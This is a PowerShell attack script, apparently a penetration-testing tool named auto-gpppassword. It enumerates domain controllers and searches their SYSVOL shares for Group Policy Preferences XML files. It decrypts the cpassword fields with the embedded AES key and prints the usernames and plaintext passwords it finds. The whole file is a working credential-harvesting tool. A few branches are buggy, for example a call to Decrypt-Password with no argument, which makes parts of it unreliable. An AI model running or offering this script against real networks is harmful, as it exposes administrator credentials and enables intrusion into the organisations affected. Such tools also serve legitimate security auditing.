<#
.Synopsis

Based on Get-GPPPassword by Chris Cambell (@obsuresec) which retrieves
the encrypted password for local admin accounts pushed through Group Policy Preferences
and then decryptes it.

Author: Nikhil Sreekunar (@roo7break)
License: GNU GPL v2
Version: v1.0

.Description
Based on Get-GPPPassword by Chris Cambell (@obsuresec) which retrieves
the encrypted password for local admin accounts pushed through Group Policy Preferences
and then decryptes it.

Auto-gpppassword will enumerate all the domains to which the current user
is a member of as well as all domains accessible within the network before trying to
extract the encrypted passwords.

.Example

Default is to enumerate domains to which current user is a member of
.\auto-gpppassword

To enumerate all domains accessible from the network
.\auto-gpppassword -enumall:$true

By default the script will not check for network access to the server. This
requires admin access to the system (for packet crafting).
.\auto-gpppassword -checkacc:$true

.Links
http://roo7break.co.uk
http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
http://rewtdance.blogspot.co.uk/2012/06/exploiting-windows-2008-group-policy.html
http://dev.metasploit.com/redmine/projects/framework/repository/entry/modules/post/windows/gather/credentials/gpp.rb
#>

[CmdletBinding()]

Param([Parameter(Mandatory=$false)] [bool] $enumall=$false,
	  [Parameter(Mandatory=$false)] [bool] $checkacc=$false)
function auto-gpppassword {
	#Function to search for xml files
	function search-XML {
		Param ([string[]] $ScanDC)
		#Command to search for files recursively and identify by
		foreach($DC in $ScanDC){
			$ErrorActionPreference = "SilentlyContinue"
			Write-Host -foregroundcolor Gray "`n[info] Scanning $DC "
			$XMLFiles = Get-ChildItem -Path "\\$DC\SYSVOL\" -recurse -filter *.xml
			if ($XMLFiles -ne $null){
				[int] $filecount = $XMLFiles.Count
				Write-host -foregroundcolor yellow "[info] Found $filecount xml files of interest in $DC"
				foreach($XMLs in $XMLFiles){					
					$CPass = ""
					$NName = ""
					$UName = ""
					$Lastchange = ""
					$Filename = $XMLs.Name
					$FPath = $XMLs.VersionInfo.Filename
					
					[xml] $GetXMLContent = Get-Content ($FPath)
					
					#Ported (and edited) from Get-GPPPassword.ps1
					#https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
					#support for additional files (Drives, Printers) added
					#support to scan for multiple accounts within same file
					
					switch ($Filename){
						"Groups.xml"{
							foreach ($Users in $GetXMLContent.Groups.User){								
								$encCpass = $Users.Properties.cpassword
								
								if ($encCpass -ne $null){$CPass = Decrypt-Password $encCpass}
								$NName = $Users.Properties.newName
								$UName = $Users.Properties.userName
								$Lastchange = $Users.changed
								#create object to return results
								
								if ($CPass){
									$ScanResults = @{
										'Scanned File = ' = $FPath;
										'Username = ' = $UName;
										'Encrypted Password = ' = $encCpass;
										'Password = ' = $CPass;
										'Last changed = ' = $Lastchange;
										'New Name = ' = $NName;
									}
									Write-Host -foregroundcolor green "`n[woot] Found the treasure"
									$OutputResults = New-Object PSObject -Property $ScanResults
									Write-Output $OutputResults
								}
							}							
						}
						"Services.xml"{
							foreach ($NTServ in $GetXMLContent.NTServices.NTService){
								
								$encCpass = $NTServ.Properties.cpassword
								
								if ($encCpass -ne $null){$CPass = Decrypt-Password $encCpass}								
								$UName = $NTServ.Properties.accountName
								$Lastchange = $NTServ.changed
								#create object to return results
								
								if ($CPass){
									$ScanResults = @{
										'Scanned File = ' = $FPath;
										'Username = ' = $UName;
										'Encrypted Password = ' = $encCpass;
										'Password = ' = $CPass;
										'Last changed = ' = $Lastchange;
										'New Name = ' = $NName;
									}
									Write-Host -foregroundcolor green "`n[woot] Found the treasure"
									$OutputResults = New-Object PSObject -Property $ScanResults
									Write-Output $OutputResults
								}
							}
						}
						"Printers.xml"{
							foreach ($Prints in $GetXMLContent.Printers.SharedPrinter){
								
								$encCpass = $Prints.Properties.cpassword
								
								if ($encCpass -ne $null){$CPass = Decrypt-Password $encCpass}	
								$CPass = Decrypt-Password 
								$UName = $Prints.Properties.username
								$Lastchange = $Prints.changed
								#create object to return results
								
								if ($CPass){
									$ScanResults = @{
										'Scanned File = ' = $FPath;
										'Username = ' = $UName;
										'Encrypted Password = ' = $encCpass;
										'Password = ' = $CPass;
										'Last changed = ' = $Lastchange;
										'New Name = ' = $NName;
									}
									Write-Host -foregroundcolor green "`n[woot] Found the treasure"
									$OutputResults = New-Object PSObject -Property $ScanResults
									Write-Output $OutputResults
								}
							}
						}
						"Drives.xml"{
							foreach ($Drvs in $GetXMLContent.Drives.Drive){
								
								$encCpass = $Drvs.Properties.cpassword	
								
								if ($encCpass -ne $null){$CPass = Decrypt-Password $encCpass}													
								$UName = $Drvs.Properties.userName
								$Lastchange = $Drvs.changed
								#create object to return results
								
								if ($CPass){
									$ScanResults = @{
										'Scanned File = ' = $FPath;
										'Username = ' = $UName;
										'Encrypted Password = ' = $encCpass;
										'Password = ' = $CPass;
										'Last changed = ' = $Lastchange;
										'New Name = ' = $NName;
									}
									Write-Host -foregroundcolor green "`n[woot] Found the treasure"
									$OutputResults = New-Object PSObject -Property $ScanResults
									Write-Output $OutputResults
								}
							}
						}
						"DataSources.xml"{
							foreach ($Dsource in $GetXMLContent.DataSources.DataSource){
								
								$encCpass = $Dsource.Properties.cpassword	
								
								if ($encCpass -ne $null){$CPass = Decrypt-Password $encCpass}
											
								$UName = $Dsource.Properties.username
								$Lastchange = $Dsource.changed
								#create object to return results
								
								if ($CPass){
									$ScanResults = @{
										'Scanned File = ' = $FPath;
										'Username = ' = $UName;
										'Encrypted Password = ' = $encCpass;
										'Password = ' = $CPass;
										'Last changed = ' = $Lastchange;
										'New Name = ' = $NName;
									}
									Write-Host -foregroundcolor green "`n[woot] Found the treasure"
									$OutputResults = New-Object PSObject -Property $ScanResults
									Write-Output $OutputResults
								}
							}
						}
						"ScheduledTasks.xml"{
							foreach ($Tasks in $GetXMLContent.ScheduledTasks.Task){
								
								$encCpass = $Tasks.Properties.cpassword
								
								if ($encCpass -ne $null){$CPass = Decrypt-Password $encCpass}
								
								$UName = $Tasks.Properties.runAs
								$Lastchange = $Tasks.changed
								#create object to return results
								
								if ($CPass){
									$ScanResults = @{
										'Scanned File = ' = $FPath;
										'Username = ' = $UName;
										'Encrypted Password = ' = $encCpass;
										'Password = ' = $CPass;
										'Last changed = ' = $Lastchange;
										'New Name = ' = $NName;
									}
									Write-Host -foregroundcolor green "`n[woot] Found the treasure"
									$OutputResults = New-Object PSObject -Property $ScanResults
									Write-Output $OutputResults
								}
							}
						}
						default { Write-Host -foreground cyan "`n`t[warning] $Filename is not in my list. However, let me do a quick regex check"
								  $output = Get-Content $FPath; 
								  $cpass = [regex]::match($output,'cpassword="(?<pwd>.+?)"') 
								  $encrpass = $cpass | foreach {$_.groups["pwd"].value}
								  if ($Cpasswd -ne $null) {
									$Cpasswd = Decrypt-Password $encrpass
									Write-Host -foregroundcolor green "`n[woot] $Filename has a cpassword value. Decrypted: $Cpasswd. Report this file to the author of the script.`n"
								  }
						}
					}
				}
			}
			else {
				Write-Host -foregroundcolor red "`t[error] No XML files found"
				continue
			} 
			
		}
	}

	#Function to enumerate database
	function enumDC{
		Param ([bool] $enumall)
		$DCall = @()
		$DCmemberof = @()
		
		#Let me first check if the user belongs to any domain
		if((gwmi win32_computersystem).partofdomain -ne $Null) {
			if(($env:userdnsdomain) -eq $Null) {
				throw "[error] Account is not part of any domain"
			}
			else{
				#Get all domains that the current user is part of
				$DCmemberof = ([system.directoryservices.activedirectory.activedirectorysite]::getcomputersite()).Servers | %{$_.Name}
				if ($DCmemberof -ne $Null){
					Write-Host -fore yellow "[info] User is a member of the following domains:"
					foreach ($items in $DCmemberof){Write-Host -fore green "`t$items"}
				}
				if ($enumall){
					#Get all domains accessible within network
					$DCall = [system.directoryservices.activedirectory.domain]::getcurrentdomain() | %{$_.DomainControllers} | %{$_.Name}
					if ($DCall -ne $Null){
						Write-Host -fore yellow "[info] Additional domains were identified:"
						foreach ($items in $DCall){Write-Host -fore green "`t$items"}
					}
				}
			}
		}
		else {throw "[error] System is not part of any domain" }
		if ($enumall){
			return $DCmemberof + $DCall
		}
		else {return $DCmemberof}
	}

	#Function to check if we can access port 389 (LDAP) of the server
	#Ported from http://www.onesimplescript.com/2012/03/using-powershell-to-find-local-domain.html
	function checkAccess {
		Param ([string[]] $DClist)
		#Write-Host $DClist
		$DCaccessible = @()
		Write-Host -fore yellow "`n[info] Testing accessibility"
		foreach ($DCs in $DClist){
			try {
				$ConnClient = New-Object System.Net.Sockets.TCPClient
				$Access389 = $ConnClient.BeginConnect($DCs,389,$null,$null)
				$Waitfor = $Access389.AsyncWaitHandle.WaitOne(200,$False)
				if ($ConnClient.Connected){
					Write-host -fore green "`t Server $DCs is accessible"
					$DCaccessible += $DCs
				}
				$Null = $ConnClient.Close()
			} catch { throw "[error] Network error."}
		}
		return $DCaccessible
	}

	#Function that decodes and decrypts password
	#From http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
	function Decrypt-Password {
        Param (
            [string] $Cpassword 
        )
		#Write-host "Decrypting $Cpassword"
        try {
            #Append appropriate padding based on string length  
            $Mod = ($Cpassword.length % 4)
            if ($Mod -ne 0) {$Cpassword += ('=' * (4 - $Mod))}

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
            #Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
            #Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor() 
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
			$decrCpass = [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
            return $decrCpass
        } catch {Write-Error "[error] Decryption Failed $Error[0]"}
    }  
	
	#First we enumerate to find DCs to exploit
	Write-Host "`n|--------------- Auto-gpppassword --------------|"
	Write-Host "| Get local admin passwords from GPP XML file   |"
	Write-Host "|                                               |"
	Write-Host "| Author: Nikhil Sreekumar (@roo7break)         |"
	Write-Host "| Email: roo7break@gmail.com                    |"
	Write-Host "| Version: v1.0                                 |"
	Write-Host "| Website: www.roo7break.co.uk                  |"
	Write-Host "| --------------------------------------------- |`n"
	
	#Report the configured options
	Write-host -foregroundcolor yellow "[info] Set Options"
	Write-host -foregroundcolor green "`tEnumerate all accessible domains: $enumall"
	Write-host -foregroundcolor green "`tCheck network access to servers: $checkacc`n"
	
	Write-Host -foregroundcolor cyan "[info] Staring Enumeration`n"
	
	$GetDCs = enumDC $enumall
	$GetDCs = $GetDCs | sort -unique
	
	#Next, lets confirm if we can access the enumerated DCs
	if($checkacc){
		Write-Host -foregroundcolor cyan "`n[info] Checking Access to enumerated servers"
		$AccessList = checkAccess $GetDCs
	}
	else{
		Write-Host -foregroundcolor cyan "`n[info] Access checks will be ignored as per request"
		$AccessList = $GetDCs
	}
	#Finally, we search each accessible DCs for GPP xml files
	Write-Host -foregroundcolor cyan "`n[info] Searching for treasure"
	search-XML $AccessList
}

auto-gpppassword